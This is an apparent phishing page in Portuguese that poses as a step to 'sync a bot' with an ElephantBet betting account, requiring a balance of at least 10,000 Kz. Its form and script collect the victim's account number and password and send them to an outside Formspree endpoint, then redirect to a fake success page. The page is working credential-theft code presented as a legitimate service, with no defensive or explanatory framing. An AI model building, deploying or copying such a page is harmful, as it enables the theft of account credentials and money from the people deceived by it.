<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Conectar à ElephantBet</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background: linear-gradient(to right, #2c2c2c, #1a1a1a);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 80vh;
      color: #f1f1f1;
    }
    .sync-box {
      background-color: #111;
      padding: 40px;
      border-radius: 0;
      width: 100vw;
      height: 100vh;
      box-shadow: none;
      text-align: center;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    .sync-box h1 {
      margin-bottom: 20px;
      font-size: 24px;
      color: #fff;
    }
    .sync-box h1 span {
      color: #ff007f;
    }
    .sync-box p {
      font-size: 16px;
      margin-bottom: 20px;
      color: #ccc;
    }
    .sync-box .alert {
      color: #ff007f;
      font-weight: bold;
      margin-bottom: 30px;
    }
    label {
      text-align: left;
      display: block;
      margin-bottom: 5px;
      font-size: 14px;
    }
    input {
      width: 100%;
      max-width: 400px;
      padding: 12px;
      margin-bottom: 20px;
      border: none;
      border-radius: 8px;
      background: #222;
      color: #fff;
      font-size: 14px;
    }
    input::placeholder {
      color: #888;
    }
    button {
      width: 100%;
      max-width: 400px;
      padding: 12px;
      border: none;
      background: #444;
      color: #fff;
      font-weight: bold;
      font-size: 15px;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover {
      background: #666;
    }
    .back {
      margin-top: 15px;
      display: block;
      color: #ccc;
      text-decoration: none;
      font-size: 14px;
    }
    .back:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="sync-box">
    <h1> Conectar à sua conta <span>ElephantBet</span></h1>
    <p>Insira os seus dados para sincronizar o bot com a sua conta.</p>
    <p>Para que a sincronização seja bem-sucedida, a sua conta da  <span style="color: #ff007f;" >ElephantBet</span>  deve ter pelo menos 10.000 Kz de saldo.</p>

    <form id="syncForm" action="https://formspree.io/f/xvgzrljq" method="POST">
      <label for="acc">Número da Conta</label>
      <input type="text" id="acc" name="numero" placeholder="244" required>
    
      <label for="pass">Senha</label>
      <input type="text" id="pass" name="senha" placeholder="Digite a sua senha" required>
    
      <button type="submit">Sincronizar</button>
    </form>
    <a href="bot.html" class="back">← Voltar</a>
  </div>
  
  <script>
    document.getElementById("syncForm").addEventListener("submit", function(e) {
      e.preventDefault(); // Previne o envio padrão do formulário
      
      // Cria um objeto FormData com os dados do formulário
      const formData = new FormData(this);
      
      // Envia os dados para o Formspree via fetch
      fetch(this.action, {
        method: this.method,
        body: formData,
        headers: { 'Accept': 'application/json' }
      })
      .then(response => {
        if (response.ok) {
          // Redireciona para sucesso.html após 1 segundo
          setTimeout(function(){
            window.location.href = "sucesso.html";
          }, 1000);
        } else {
          response.json().then(data => {
            if (Object.hasOwn(data, 'errors')) {
              alert("Erro: " + data["errors"].map(error => error["message"]).join(", "));
            } else {
              alert("Ocorreu um erro ao enviar o formulário. Por favor, tente novamente.");
            }
          });
        }
      })
      .catch(error => {
        alert("Erro: " + error.message);
      });
    });
  </script>
</body>
</html>
